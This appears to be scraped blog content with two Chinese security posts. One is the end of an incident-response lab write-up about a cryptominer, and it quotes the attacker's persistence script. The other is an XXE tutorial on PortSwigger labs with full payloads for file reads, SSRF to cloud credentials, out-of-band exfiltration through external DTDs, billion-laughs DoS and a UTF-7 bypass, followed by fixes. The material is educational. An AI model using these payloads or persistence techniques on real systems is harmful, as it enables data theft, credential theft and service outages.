\u0026amp;\u0026amp; http http.response.code==404 30个左右 (192.168.37.100/192.168.37.103/192.168.37.104/192.168.37.107/192.168.37.108/192.168.37.109/192.168.37.110/192.168.37.111/192.168.37.112/192.168.37.113/114/115/116/117/34/35/36/37/38/39/40/41/42/43/44/10) 在2025.6.22日17点03分27秒，192.168.37.10，55689端口进行访问的url路径以flag方式进行提交(应急三要素缩小范围) 1 2 3 ip.addr == 192.168.37.10 \u0026amp;\u0026amp; tcp.port == 55689 flag{192.168.37.11:8080/servlet/user/uploadAvatar} 提交存在使用NMAP扫描特征的IP 1 2 3 192.168.37.4 http.user_agent contains \u0026#34;nmap\u0026#34; 审计流量并结合web站点，攻击者通过什么漏洞进行控制主机，提交漏洞文件名接口 1 2 任意文件上传 /servlet/user/uploadAvatar 审计流量并结合web站点，攻击者通过哪个用户名利用的漏洞，提交其注册用户名 1 wangyunqing 审计流量并结合漏洞，提交攻击者控制成功木马文件名 1 2 ip.addr == 192.168.37.11 \u0026amp;\u0026amp; http \u0026amp;\u0026amp; ip.addr == 192.168.37.10 /uploads/70b86b64-ce15-46bf-8095-4764809e2ee5.jsp 审计流量并清除掉攻击者上传的木马，清除成功后在/var/flag/1/flag中查看flag并提交 1 flag{1979c46c2af37dc62a4b05881e816995} 黑客拿到主机权限后，上传了挖矿木马，需要你提交矿池地址 查看计划任务，发现存在可疑任务，查看脚本内容，将miner.jar保存放微步沙箱运行，确认是挖矿程序\n1 矿池地址：pool.minexmr.com 清除掉主机上的挖矿木马，完成后在/var/flag/2/flag文件中查看flag并提交 清除tmp目录下的挖矿程序可获得flag2\n1 flag{da236fe0cda81bfc03d022799589110e} 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 oot@1818c9e077a4:/var/lib/tomcat9/webapps/ROOT/uploads# cat /usr/share/.per/persistence.sh #!/bin/bash SOURCE_FILE=\u0026#34;/usr/share/.miner/miner.jar\u0026#34; DEST_FILE=\u0026#34;/tmp/miner.jar\u0026#34; PROCESS_NAME=\u0026#34;java -jar $DEST_FILE\u0026#34; LOG_FILE=\u0026#34;/var/log/.malware_events.log\u0026#34; if pgrep -f \u0026#34;$PROCESS_NAME\u0026#34; \u0026gt; /dev/null; then exit 0 else echo \u0026#34;[$(date)] Miner process not found. Taking action...\u0026#34; \u0026gt;\u0026gt; \u0026#34;$LOG_FILE\u0026#34; if [ ! -f \u0026#34;$DEST_FILE\u0026#34; ]; then echo \u0026#34;[$(date)] Miner file ($DEST_FILE) is missing. Restoring from backup...\u0026#34; \u0026gt;\u0026gt; \u0026#34;$LOG_FILE\u0026#34; cp \u0026#34;$SOURCE_FILE\u0026#34; \u0026#34;$DEST_FILE\u0026#34; chmod +x \u0026#34;$DEST_FILE\u0026#34; fi if [ -f \u0026#34;$DEST_FILE\u0026#34; ]; then nohup java -jar \u0026#34;$DEST_FILE\u0026#34; \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp; echo \u0026#34;[$(date)] Miner process restarted with PID $!.\u0026#34; \u0026gt;\u0026gt; \u0026#34;$LOG_FILE\u0026#34; else echo \u0026#34;[$(date)] CRITICAL: Could not restore miner file from backup. Cannot start.\u0026#34; \u0026gt;\u0026gt; \u0026#34;$LOG_FILE\u0026#34; fi 黑客做了后门，即使你清除以后，仍然会定时更新挖矿程序并运行，你找到这个程序，提交其路径 1 2 恶意计划任务脚本文件路径：/usr/share/.per/persistence.sh 挖矿后门路径：/usr/share/.miner/miner.jar 清除掉后门挖矿程序，在/var/flag/3/flag下查看提交flag 1 flag{27bd067769b51ed71f899c7a6f08af2c} ","date":"2025-06-24T15:15:15+08:00","image":"https://lserein.github.io/p/%E6%9F%90%E6%8C%96%E7%9F%BF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BAwp/logo_hu_3c3a52b07ea36d92.jpeg","permalink":"https://lserein.github.io/p/%E6%9F%90%E6%8C%96%E7%9F%BF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BAwp/","title":"某挖矿应急响应靶场WP"},{"content":"https://xz.aliyun.com/news/2994?time__1311=eqfxBQD%3DDQIxl6zq0%3DoGQditwP7Kp%2Box\u0026amp;u_atoken=6ea3ed7a034f6a3fc07cf23413e029c3\u0026amp;u_asig=1a0c399717420910296496960e0044\n1.XXE漏洞介绍 XXE漏洞原理 - FreeBuf网络安全行业门户\nXXE（XML External Entity）漏洞，即 XML 外部实体注入漏洞，是一种常见的 Web 安全漏洞\nXML（可扩展标记语言）在解析过程中，允许用户通过定义实体来引用外部资源。如果应用程序在处理 XML 数据时，没有对用户输入的 XML 内容进行严格的过滤和验证，攻击者就可以构造恶意的 XML 数据，通过定义恶意外部实体来访问本地文件系统、发起网络请求或执行其他恶意操作。\n2.XML基础知识 XML注入介绍\u0026ndash;XXE，XEE,xpath等 - lcamry - 博客园\nXML（eXtensible Markup Language），即可扩展标记语言，是一种用于标记电子文件使其具有结构性标记的标记语言\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; ----文档声明 \u0026lt;students\u0026gt; ---根元素 \u0026lt;student\u0026gt; ---子元素 \u0026lt;name\u0026gt;张三\u0026lt;/name\u0026gt; ---子元素属性和值 \u0026lt;age\u0026gt;20\u0026lt;/age\u0026gt; \u0026lt;/student\u0026gt; \u0026lt;student\u0026gt; \u0026lt;name\u0026gt;李四\u0026lt;/name\u0026gt; \u0026lt;age\u0026gt;21\u0026lt;/age\u0026gt; \u0026lt;/student\u0026gt; \u0026lt;/students\u0026gt; XML 文档声明，在文档的第一行 XML 文档类型定义，即DTD，XXE 漏洞所在的地方 XML 文档元素 XML 文档的第一行通常是文档声明，用于指定 XML 的版本和编码等信息，如 \u0026lt;font style=\u0026quot;color:rgba(0, 0, 0, 0.9);\u0026quot;\u0026gt;\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt;\u0026lt;/font\u0026gt; 。\n每个 XML 文档必须有且只有一个根元素，它是整个文档的顶层元素，其他所有元素都嵌套在根元素内部。例如：\u0026lt;students\u0026gt; 是根元素，包含了多个 \u0026lt;student\u0026gt; 子元素。\n2.1.内部实体 在正常使用且经过严格验证的场景下，内部实体通常是安全的。因为它们的值是固定的，在编写代码时就已经明确指定 ，不会从外部获取不可信的数据。\n1 2 3 4 5 6 7 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE root [ \u0026lt;!ENTITY company \u0026#34;阿里巴巴\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;root\u0026gt; \u0026lt;companyName\u0026gt;\u0026amp;company;\u0026lt;/companyName\u0026gt; \u0026lt;/root\u0026gt; 不安全的情况DDOS漏洞\n如果应用程序在处理包含内部实体的 XML 数据时，没有对实体引用进行适当的限制和验证，攻击者可能通过构造特殊的内部实体来达到恶意目的。例如，攻击者可以利用内部实体进行递归解析攻击（也称为 XML 实体膨胀攻击），导致内存耗尽从而引发拒绝服务（DoS）攻击：\n1 2 3 4 5 6 7 8 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE lolz [ \u0026lt;!ENTITY lol \u0026#34;lol\u0026#34;\u0026gt; \u0026lt;!ENTITY lol2 \u0026#34;\u0026amp;lol;\u0026amp;lol;\u0026amp;lol;\u0026amp;lol;\u0026amp;lol;\u0026amp;lol;\u0026amp;lol;\u0026amp;lol;\u0026amp;lol;\u0026amp;lol;\u0026#34;\u0026gt; \u0026lt;!ENTITY lol3 \u0026#34;\u0026amp;lol2;\u0026amp;lol2;\u0026amp;lol2;\u0026amp;lol2;\u0026amp;lol2;\u0026amp;lol2;\u0026amp;lol2;\u0026amp;lol2;\u0026amp;lol2;\u0026amp;lol2;\u0026#34;\u0026gt; \u0026lt;!-- 以此类推，不断增加嵌套 --\u0026gt; ]\u0026gt; \u0026lt;lolz\u0026gt;\u0026amp;lol3;\u0026lt;/lolz\u0026gt; 2.2.外部实体 外部实体是指引用外部资源的实体，其值需要从外部文件系统、网络等位置获取。 1 2 3 4 5 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; xml声明 \u0026lt;!DOCTYPE foo [\txml文档类型定义，即dtd，xxe漏洞存在的地方 \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;foo\u0026gt;\u0026amp;xxe;\u0026lt;/foo\u0026gt;\txml文档元素 3.Burp靶场XXE漏洞 【Burp系列】超全XXE注入漏洞实验总结（建议收藏）\nXXE漏洞\u0026mdash;抓包得是XML格式数据包，否则大概率不存在此类型漏洞，现在大部分都是Json格式数据包\n3.1.利用 XXE 使用外部实体检索文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 POST /product/stock HTTP/2 Host: 0ab900e90317b03082b206b900d600d8.web-security-academy.net Cookie: session=uZvFscQ1qEEYqbg9aO5p2I4LFojVnL3Y User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0ab900e90317b03082b206b900d600d8.web-security-academy.net/product?productId=2 Content-Type: application/xml Content-Length: 195 Origin: https://0ab900e90317b03082b206b900d600d8.web-security-academy.net Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY productId SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;stockCheck\u0026gt;\u0026lt;productId\u0026gt;\u0026amp;productId;\u0026lt;/productId\u0026gt;\u0026lt;storeId\u0026gt;1\u0026lt;/storeId\u0026gt; \u0026lt;/stockCheck\u0026gt; 3.2.利用 XXE 执行 SSRF 攻击 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 POST /product/stock HTTP/2 Host: 0aaa00220477468580c9262300880030.web-security-academy.net Cookie: session=zbfNXGA4nnaLwYPatrbLikRgEp9acvBP User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0aaa00220477468580c9262300880030.web-security-academy.net/product?productId=2 Content-Type: application/xml Content-Length: 247 Origin: https://0aaa00220477468580c9262300880030.web-security-academy.net Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY productId SYSTEM \u0026#34;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;stockCheck\u0026gt;\u0026lt;productId\u0026gt;\u0026amp;productId;\u0026lt;/productId\u0026gt;\u0026lt;storeId\u0026gt;1\u0026lt;/storeId\u0026gt; \u0026lt;/stockCheck\u0026gt; 3.3.具有带外交互的盲 XXE 通常可以使用与XXE SSRF攻击相同的技术来检测XXE盲注，但会触发与控制的系统的带外网络交互。\n就是利用DNSlog回显\n**3.4.**通过 XML 参数实体进行带外交互的盲 XXE 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 POST /product/stock HTTP/2 Host: 0a77000403086e1882040c65003100c2.web-security-academy.net Cookie: session=q8uas8nKvYT7xLRUu6iXUFmpMrat089L User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0a77000403086e1882040c65003100c2.web-security-academy.net/product?productId=2 Content-Type: application/xml Content-Length: 220 Origin: https://0a77000403086e1882040c65003100c2.web-security-academy.net Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE stockCheck [\u0026lt;!ENTITY % xxe SYSTEM \u0026#34;http://wcc8ll0z0pcnvp3glpi8h98ygpmiafy4.oastify.com\u0026#34;\u0026gt; %xxe; ]\u0026gt; \u0026lt;stockCheck\u0026gt;\u0026lt;productId\u0026gt;1\u0026lt;/productId\u0026gt;\u0026lt;storeId\u0026gt;1\u0026lt;/storeId\u0026gt; \u0026lt;/stockCheck\u0026gt; 3.5.利用盲 XXE 使用恶意外部 DTD 泄露数据 先利用DNSlog检测是否存在XXE漏洞，复制payload\n1 2 3 4 \u0026lt;!ENTITY % file SYSTEM \u0026#34;file:///etc/hostname\u0026#34;\u0026gt; \u0026lt;!ENTITY % eval \u0026#34;\u0026lt;!ENTITY \u0026amp;#x25; exfil SYSTEM \u0026#39;http://ozr08dnrnhzfihq88h5041vq3h9cx6lv.oastify.com/?x=%file;\u0026#39;\u0026gt;\u0026#34;\u0026gt; %eval; %exfil; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 POST /product/stock HTTP/2 Host: 0aa0003504fcb5778164521500d20028.web-security-academy.net Cookie: session=eDu0KWXSUXYtvyVCmMAZ2JYHxdRHg3tA User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0aa0003504fcb5778164521500d20028.web-security-academy.net/product?productId=2 Content-Type: application/xml Content-Length: 232 Origin: https://0aa0003504fcb5778164521500d20028.web-security-academy.net Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [\u0026lt;!ENTITY % xxe SYSTEM \u0026#34;https://exploit-0a8100360489b5fb816c51a9017000f6.exploit-server.net/exploit\u0026#34;\u0026gt; %xxe;]\u0026gt;\u0026lt;stockCheck\u0026gt;\u0026lt;productId\u0026gt;2\u0026lt;/productId\u0026gt;\u0026lt;storeId\u0026gt;1\u0026lt;/storeId\u0026gt;\u0026lt;/stockCheck\u0026gt; 3.6.利用盲 XXE 通过错误消息检索数据 将这个恶意dtd payload保存在云主机上，并开启共享，以便服务器能加载实体\n1 2 3 4 \u0026lt;!ENTITY % file SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; \u0026lt;!ENTITY % eval \u0026#34;\u0026lt;!ENTITY \u0026amp;#x25; exfil SYSTEM \u0026#39;file:///invalid/%file;\u0026#39;\u0026gt;\u0026#34;\u0026gt; %eval; %exfil; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 POST /product/stock HTTP/2 Host: 0afc00c503b18075d46254bf005400f7.web-security-academy.net Cookie: session=AI6ZyMoYuy2FUDcOSqVc5PeIDi43w2z2 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0afc00c503b18075d46254bf005400f7.web-security-academy.net/product?productId=2 Content-Type: application/xml Content-Length: 244 Origin: https://0afc00c503b18075d46254bf005400f7.web-security-academy.net Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE stockCheck [\u0026lt;!ENTITY % xxe SYSTEM \u0026#34;https://exploit-0a8e00bd03cb806fd4e95365018c0047.exploit-server.net/exploit\u0026#34;\u0026gt; %xxe; ]\u0026gt; \u0026lt;stockCheck\u0026gt;\u0026lt;productId\u0026gt;1\u0026lt;/productId\u0026gt;\u0026lt;storeId\u0026gt;1\u0026lt;/storeId\u0026gt; \u0026lt;/stockCheck\u0026gt; 3.7.利用 XInclude 检索文件 也可以使用burp的主动扫描模块，测试是否存在XML注入问题\n抓包，发现数据包不是XML格式数据包，将productId内容替换为\n1 \u0026lt;foo xmlns:xi=\u0026#34;http://www.w3.org/2001/XInclude\u0026#34;\u0026gt;\u0026lt;xi:include parse=\u0026#34;text\u0026#34; href=\u0026#34;file:///etc/passwd\u0026#34;/\u0026gt;\u0026lt;/foo\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 POST /product/stock HTTP/2 Host: 0a1d008b04cc106580c2350700390019.web-security-academy.net Cookie: session=Kk4by4ZvCLdwN9KP8SPwkJOG93UdYLw1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0a1d008b04cc106580c2350700390019.web-security-academy.net/product?productId=2 Content-Type: application/x-www-form-urlencoded Content-Length: 126 Origin: https://0a1d008b04cc106580c2350700390019.web-security-academy.net Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers productId=\u0026lt;foo xmlns:xi=\u0026#34;http://www.w3.org/2001/XInclude\u0026#34;\u0026gt;\u0026lt;xi:include parse=\u0026#34;text\u0026#34; href=\u0026#34;file:///etc/passwd\u0026#34;/\u0026gt;\u0026lt;/foo\u0026gt;\u0026amp;storeId=1 3.8.通过图像文件上传利用 XXE\u0026mdash;SVG XXE 创建一个后缀为SVG的图像文件,如果文件上传成功后你的DNSlog地址收到回显，则表明存在漏洞\n1 2 3 4 5 6 7 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE note [ \u0026lt;!ENTITY file SYSTEM \u0026#34;http://124.222.183.149:58888/microsoft/\u0026#34; \u0026gt; ]\u0026gt; \u0026lt;svg height=\u0026#34;100\u0026#34; width=\u0026#34;1000\u0026#34;\u0026gt; \u0026lt;text x=\u0026#34;10\u0026#34; y=\u0026#34;20\u0026#34;\u0026gt;\u0026amp;file;\u0026lt;/text\u0026gt; \u0026lt;/svg\u0026gt; 1 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt;\u0026lt;!DOCTYPE test [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34; \u0026gt; ]\u0026gt;\u0026lt;svg width=\u0026#34;128px\u0026#34; height=\u0026#34;128px\u0026#34; xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34; xmlns:xlink=\u0026#34;http://www.w3.org/1999/xlink\u0026#34; version=\u0026#34;1.1\u0026#34;\u0026gt;\u0026lt;text font-size=\u0026#34;16\u0026#34; x=\u0026#34;0\u0026#34; y=\u0026#34;16\u0026#34;\u0026gt;\u0026amp;xxe;\u0026lt;/text\u0026gt;\u0026lt;/svg\u0026gt; 除了SVG图像能造成XXE外，上传Excel，Word文档也能造成XXE漏洞\n3.9.利用 XXE 通过重新利用本地 DTD 来检索数据 在元素之间插入以下实体内容，这将导入Yelp DTD，然后重新定义ISOamso实体，触发包含/etc/passwd文件内容的错误消息\n1 2 3 4 5 6 7 8 9 10 \u0026lt;!DOCTYPE message [ \u0026lt;!ENTITY % local_dtd SYSTEM \u0026#34;file:///usr/share/yelp/dtd/docbookx.dtd\u0026#34;\u0026gt; \u0026lt;!ENTITY % ISOamso \u0026#39; \u0026lt;!ENTITY \u0026amp;#x25; file SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; \u0026lt;!ENTITY \u0026amp;#x25; eval \u0026#34;\u0026lt;!ENTITY \u0026amp;#x26;#x25; error SYSTEM \u0026amp;#x27;file:///nonexistent/\u0026amp;#x25;file;\u0026amp;#x27;\u0026gt;\u0026#34;\u0026gt; \u0026amp;#x25;eval; \u0026amp;#x25;error; \u0026#39;\u0026gt; %local_dtd; ]\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 POST /product/stock HTTP/2 Host: 0a26004504ede4f781f58428005d00c0.web-security-academy.net Cookie: session=FWVlNkyfyyWz2rJT8klgq4UhaWFQvhUT User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0a26004504ede4f781f58428005d00c0.web-security-academy.net/product?productId=2 Content-Type: application/xml Content-Length: 425 Origin: https://0a26004504ede4f781f58428005d00c0.web-security-academy.net Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE message [ \u0026lt;!ENTITY % local_dtd SYSTEM \u0026#34;file:///usr/share/yelp/dtd/docbookx.dtd\u0026#34;\u0026gt; \u0026lt;!ENTITY % ISOamso \u0026#39; \u0026lt;!ENTITY \u0026amp;#x25; file SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; \u0026lt;!ENTITY \u0026amp;#x25; eval \u0026#34;\u0026lt;!ENTITY \u0026amp;#x26;#x25; error SYSTEM \u0026amp;#x27;file:///nonexistent/\u0026amp;#x25;file;\u0026amp;#x27;\u0026gt;\u0026#34;\u0026gt; \u0026amp;#x25;eval; \u0026amp;#x25;error; \u0026#39;\u0026gt; %local_dtd; ]\u0026gt;\u0026lt;stockCheck\u0026gt;\u0026lt;productId\u0026gt;2\u0026lt;/productId\u0026gt;\u0026lt;storeId\u0026gt;1\u0026lt;/storeId\u0026gt;\u0026lt;/stockCheck\u0026gt; 3.10.利用XXE实现DDOS漏洞 1 这个的原理就是递归引用,lol 实体具体还有 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 “lol” 了，以此类推，lol10 实体含有 10^9 个 “lol” 字符串,最后再引用lol10。此时服务器加载的字符太多,可能导致崩溃. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE abc [ \u0026lt;!ENTITY lol \u0026#34;lol\u0026#34;\u0026gt; \u0026lt;!ELEMENT lolz (#PCDATA)\u0026gt; \u0026lt;!ENTITY lol1 \u0026#34;\u0026amp;lol;\u0026amp;lol;\u0026amp;lol;\u0026amp;lol;\u0026amp;lol;\u0026amp;lol;\u0026amp;lol;\u0026amp;lol;\u0026amp;lol;\u0026amp;lol;\u0026#34;\u0026gt; \u0026lt;!ENTITY lol2 \u0026#34;\u0026amp;lol1;\u0026amp;lol1;\u0026amp;lol1;\u0026amp;lol1;\u0026amp;lol1;\u0026amp;lol1;\u0026amp;lol1;\u0026amp;lol1;\u0026amp;lol1;\u0026amp;lol1;\u0026#34;\u0026gt; \u0026lt;!ENTITY lol3 \u0026#34;\u0026amp;lol2;\u0026amp;lol2;\u0026amp;lol2;\u0026amp;lol2;\u0026amp;lol2;\u0026amp;lol2;\u0026amp;lol2;\u0026amp;lol2;\u0026amp;lol2;\u0026amp;lol2;\u0026#34;\u0026gt; \u0026lt;!ENTITY lol4 \u0026#34;\u0026amp;lol3;\u0026amp;lol3;\u0026amp;lol3;\u0026amp;lol3;\u0026amp;lol3;\u0026amp;lol3;\u0026amp;lol3;\u0026amp;lol3;\u0026amp;lol3;\u0026amp;lol3;\u0026#34;\u0026gt; \u0026lt;!ENTITY lol5 \u0026#34;\u0026amp;lol4;\u0026amp;lol4;\u0026amp;lol4;\u0026amp;lol4;\u0026amp;lol4;\u0026amp;lol4;\u0026amp;lol4;\u0026amp;lol4;\u0026amp;lol4;\u0026amp;lol4;\u0026#34;\u0026gt; \u0026lt;!ENTITY lol6 \u0026#34;\u0026amp;lol5;\u0026amp;lol5;\u0026amp;lol5;\u0026amp;lol5;\u0026amp;lol5;\u0026amp;lol5;\u0026amp;lol5;\u0026amp;lol5;\u0026amp;lol5;\u0026amp;lol5;\u0026#34;\u0026gt; \u0026lt;!ENTITY lol7 \u0026#34;\u0026amp;lol6;\u0026amp;lol6;\u0026amp;lol6;\u0026amp;lol6;\u0026amp;lol6;\u0026amp;lol6;\u0026amp;lol6;\u0026amp;lol6;\u0026amp;lol6;\u0026amp;lol6;\u0026#34;\u0026gt; \u0026lt;!ENTITY lol8 \u0026#34;\u0026amp;lol7;\u0026amp;lol7;\u0026amp;lol7;\u0026amp;lol7;\u0026amp;lol7;\u0026amp;lol7;\u0026amp;lol7;\u0026amp;lol7;\u0026amp;lol7;\u0026amp;lol7;\u0026#34;\u0026gt; \u0026lt;!ENTITY lol9 \u0026#34;\u0026amp;lol8;\u0026amp;lol8;\u0026amp;lol8;\u0026amp;lol8;\u0026amp;lol8;\u0026amp;lol8;\u0026amp;lol8;\u0026amp;lol8;\u0026amp;lol8;\u0026amp;lol8;\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;abc\u0026gt;\u0026amp;lol9;\u0026lt;/abc\u0026gt; 3.11.通过UTF-7编码利用XXE 所有 XXE 攻击载荷中，仅采用了 UTF-8 编码。如前文所述，部分过滤规则主要涉及删除恶意关键字与语法符号。\n然而，若 XML 解析器被配置为接受多种字符编码，那么攻击者实际上能够发送以 UTF-7 字符集编码的恶意载荷，而非局限于 UTF-8 编码：\n1 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-7\u0026#34;?\u0026gt;+ADw-+ACE-DOCTYPE+ACA-data+ACA-+AFs-+AAo-+ACA-+ACA-+ADw-+ACE-ENTITY+ACA-xxe+ACA-SYSTEM+ACA-+ACI-file:///etc/passwd+ACI-+AD4-+AAo-+AF0-+AD4-+AAo-+ADw-data+AD4-+AAo-+ACA-+ACA-+ACA-+ACA-+ADw-post+AD4-+AAo-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ADw-post+AF8-title+AD4-+ACY-xxe+ADs-+ADw-/post+AF8-title+AD4-+AAo-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ADw-post+AF8-desc+AD4-xyz+ADw-/post+AF8-desc+AD4-+AAo-+ACA-+ACA-+ACA-+ACA-+ADw-/post+AD4-+AAo-+ADw-/data+AD4- 4.XXE漏洞危害 XEE漏洞学习(史上最详细 包括Linux配置漏洞环境)-CSDN博客\n1 2 3 4 5 任意文件读取：攻击者可以构造恶意XML外部实体，读取服务器上的敏感文件，如配置文件、数据库文件、密码文件（如/etc/passwd）等 端口扫描：请求内网的主机端口信息 命令执行：在某些环境下，攻击者可以利用XXE漏洞执行系统命令。例如，在PHP环境下，如果安装了expect扩展，攻击者可以构造恶意XML来执行系统命令 拒绝服务攻击（DoS）：通过构造特定的XML实体，攻击者可以使服务器资源耗尽，导致服务不可用 SSRF漏洞：攻击者可以利用XXE漏洞发起对内部网络或其他受限资源的请求，从而绕过防火墙和访问控制 5.XXE漏洞修复 5.1.禁用外部实体 1 2 3 4 DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); dbf.setFeature(\u0026#34;http://apache.org/xml/features/disallow-doctype-decl\u0026#34;, true); dbf.setFeature(\u0026#34;http://xml.org/sax/features/external-general-entities\u0026#34;, false); dbf.setFeature(\u0026#34;http://xml.org/sax/features/external-parameter-entities\u0026#34;, false); 1 libxml_disable_entity_loader(true); 1 2 from defusedxml.lxml import parse tree = parse(xml_string) 